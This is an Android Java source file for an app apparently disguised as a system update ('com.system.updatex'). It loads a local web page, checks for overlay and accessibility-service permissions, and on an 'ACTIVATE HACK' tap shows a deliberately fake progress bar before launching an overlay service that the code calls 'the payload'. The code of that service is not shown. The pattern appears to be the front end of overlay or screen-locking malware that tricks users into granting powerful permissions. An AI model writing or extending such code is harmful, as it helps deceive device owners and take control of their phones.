package com.system.updatex;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private WebView webView;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        
        // Load the HTML from assets
        webView.loadUrl("file:///android_asset/index.html");

        // Attach the Java bridge so JS can call Android.grantOverlay(), etc.
        webView.addJavascriptInterface(new WebAppInterface(this, this), "Android");
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Update the HTML UI with real permission status
        boolean hasOverlay = Settings.canDrawOverlays(this);
        boolean hasAccess = isAccessibilityServiceEnabled();
        
        String js = "updatePermissions(" + hasOverlay + ", " + hasAccess + ");";
        webView.evaluateJavascript(js, null);
    }

    private boolean isAccessibilityServiceEnabled() {
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
        return enabledServices.toLowerCase().contains(component.toLowerCase());
    }

    // Called by Javascript when "ACTIVATE HACK" is tapped
    public void startInjectionSequence() {
        if (!Settings.canDrawOverlays(this) || !isAccessibilityServiceEnabled()) {
            runOnUiThread(() -> {
                webView.evaluateJavascript("alert('Please grant all permissions first!');", null);
            });
            return;
        }

        // Fake 3-second progress bar
        new Thread(() -> {
            for (int i = 0; i <= 100; i += 2) {
                final int progress = i;
                runOnUiThread(() -> webView.evaluateJavascript("setProgress(" + progress + ");", null));
                try { Thread.sleep(50); } catch (InterruptedException e) {}
            }
            
            // Launch the payload
            runOnUiThread(() -> {
                try {
                    Intent serviceIntent = new Intent(MainActivity.this, OverlayService.class);
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent);
                    } else {
                        startService(serviceIntent);
                    }
                    finish();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
        }).start();
    }
}
